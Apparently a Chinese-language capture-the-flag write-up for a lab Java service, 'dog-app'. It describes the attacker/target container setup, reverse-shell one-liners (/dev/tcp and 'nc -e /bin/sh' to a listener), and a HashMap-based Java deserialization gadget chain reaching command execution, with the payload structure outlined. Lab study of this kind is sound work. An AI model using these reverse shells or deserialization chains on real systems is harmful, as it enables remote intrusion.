题目说明
	(1)两个容器的角色
	容器一:目标靶机dog-app,如127.0.0.1:38551
		这个是要攻击的目标，上面运行着一个存在漏洞利用的特别限制：这个容器只有sh没有bash等其他shell反弹shell时建议使用nc,因为它环境简陋，可能没有bash -c 等高级反弹方式
	容器二:你的攻击机(堡垒机)rev-shell
		访问地址:`http://127.0.0.1:36245`
		用ssh root@127.0.0.1 -p 36245密码root123
		用途:你可以在这个容器里开启nc监听，用来接收从dog-app反弹过来的shell;或者搭建一个HTTP/TCP服务端，用来接收从dog-app外带出来的数据
	(2)网络关系
		两个容器完全共享同一个网卡，互相访问都用127.0.0.1(本地回环)
		这意味着:从rev-shell去访问dog-app的服务，直接用127.0.0.1:38551
		dog-app反弹shell时，目标IP也是127.0.0.1端口填你在rev-shell上nc监听的端口(比如4444)
		注意端口不能冲突
	(3)大致的攻击流程总结
		1)SSH登录堡垒机
		2)在堡垒机上开启nc监听:如nc -lvp 4444,等着接收反弹shell
		3)攻击dog-app:访问http://127.0.0.1:38551,挖掘漏洞(如java反序列化)，实现远程命令执行
		4)执行反弹shell命令:因为dog-app只有sh,反弹命令用类似
			`sh -i >& /dev/tcp/127.0.0.1/4444 0>&1或nc 127.0.0.1 4444 -e /bin/sh`
		5)堡垒机的nc监听收到连接，你就会拿到ledog-app容器的shell,可以继续后续操作(读flag、提权等)

5.`hashMap`触发机制——绕过强转限制
	(1)正常流程不触发`Dog.hashCode`
		服务端代码将反序列化结果当作`Collection<Dog>`,遍历是执行`dogs.put(dog.getId().dog)`,其中key是Integer,不会调用`Dog.hashCode().`直接发送`ArrayList<Dog>`无法利用
	(2)利用`hashMap`反序列化过程
		Java的`hashMap.readObject()`在反序列化时会重建哈希表，对于每一个键值对，会调用`putVal(hash(key),key,value,...)`,而hash(key)内部：
			`static final int hash(Object key){`
				`return (key==null) ? 0:(key.hashCode())^(h>>>16);`
			`}`
			因此，如果将精心构造的Dog对象作为`HashMap`的键，反序列化时就会自动触发`key.hashCode()`,进而执行整各链
	(3)时序：命令执行先于类型转换异常
		`ois.readObject()`
		`->HashMap.readObject()->读取key(Dog)->读取values("ssss")->putVul(hash(key),key,value)->hash(key)->key.hashCode()->*命令行->返回HashMap对象->(Collection)ois.readObject()->ClassCastException->返回500`
		虽然最后因为类型不匹配抛出异常(HTTP 500),但命令已在`readObject`内部完成执行，不影响利用
	(4)最终Payload结构
		`HashMap`
		`|-key:Dog(入口Dog,名为Dog4)`
		`|`        `|-object=DogService实例(内含dogsMap)`
		`|`        `|-methodName="chainWagTail"`
		`|`        `|-paramTypes=[]`
		`|`        `|-args=[]`
		`|`        `|-DogService.dogs:`
		`|`                      `|-1->Dog1(getMethod)`
		`|`                      `|-2->Dog2(invoke步骤)` 
		`|`                      `|-3->Dog3(exec步骤)`
		`|---value:String"ssss"`
